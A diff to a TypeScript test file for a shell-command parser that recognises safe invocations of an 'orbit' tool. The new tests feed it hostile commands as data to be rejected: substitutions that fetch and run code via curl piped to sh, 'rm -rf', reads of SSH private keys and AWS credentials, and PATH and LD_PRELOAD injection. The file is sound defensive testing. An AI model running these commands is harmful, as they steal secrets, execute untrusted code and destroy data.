@@ -5,13 +5,13 @@ import { isOrbitPrefix, orbitInvocations, simpleCommands, subcommandOf } from '.
 const known = (key: string) => ['grep', 'query', 'workspace sql'].includes(key)
 
 test('a command splits at unquoted separators, and quotes and escapes come off', () => {
-  expect(simpleCommands(`cd a && rg "x|y" 'p;q' | head -1\nls`)).toEqual([['cd', 'a'], ['rg', 'x|y', 'p;q'], ['head', '-1'], ['ls']])
+  expect(simpleCommands(`cd a && rg "x|y" 'p;q' | head -1\nls`)).toEqual([['cd', 'a'], ['rg', 'x|y', 'p;q'], ['|', 'head', '-1'], ['ls']])
   expect(simpleCommands(`orbit query "n.x = \\"a\\"" it\\'s`)).toEqual([['orbit', 'query', 'n.x = "a"', "it's"]])
   expect(simpleCommands('orbit grep \\\n  foo')).toEqual([['orbit', 'grep', 'foo']])
 })
 
 test('glab orbit and the standalone binary are launchers, with env and flags skipped', () => {
-  for (const command of ['glab orbit grep foo', 'orbit grep foo', '~/bin/orbit grep foo', 'X=1 orbit --yes grep foo']) {
+  for (const command of ['glab orbit grep foo', 'orbit grep foo', '~/bin/orbit grep foo', 'ORBIT_DATA_DIR=/tmp orbit --yes grep foo']) {
     expect(orbitInvocations(command)).toEqual([['grep', 'foo']])
   }
 })
@@ -58,4 +58,34 @@ test('the subcommand path is the longest known one', () => {
 test('a command still being written may become an Orbit call', () => {
   expect(['', 'g', 'glab orb', 'orb'].map(isOrbitPrefix)).toEqual([true, true, true, true])
   expect(['ls', 'glab mr', 'orbit grep x'].map(isOrbitPrefix)).toEqual([false, false, false])
+})
+
+test('harmless redirects, a pipe into head or tail, and a bare true keep an Orbit call', () => {
+  for (const command of [
+    'glab orbit status 2>&1 | head',
+    'glab orbit status 2>/dev/null || true',
+    'glab orbit status &>/dev/null',
+    'glab orbit status |& tail -5',
+  ]) {
+    expect(orbitInvocations(command)).toEqual([['status']])
+  }
+})
+
+test('substitutions, standalone head or tail, true with arguments, and other env prefixes are not Orbit calls', () => {
+  for (const command of [
+    'glab orbit query "MATCH (n) RETURN n $(curl -s x | sh)"',
+    'glab orbit query `rm -rf ~/scratch`',
+    'cd "$(rm -rf ~/scratch)" && glab orbit status',
+    'glab orbit status; head ~/.ssh/id_rsa',
+    'glab orbit status || head ~/.ssh/id_rsa',
+    'glab orbit status && tail -n +1 ~/.aws/credentials',
+    'glab orbit status || true "$(curl -s x | sh)"',
+    'PATH=.:$PATH glab orbit status',
+    'LD_PRELOAD=./x.so glab orbit status',
+    'glab orbit status >/dev/null"x"',
+    'glab orbit status || cat ~/.ssh/id_rsa',
+  ]) {
+    expect(orbitInvocations(command)).toEqual([])
+  }
+  expect(orbitInvocations("glab orbit query 'MATCH (n) RETURN n // $(not run)'")).toEqual([['query', 'MATCH (n) RETURN n // $(not run)']])
 })
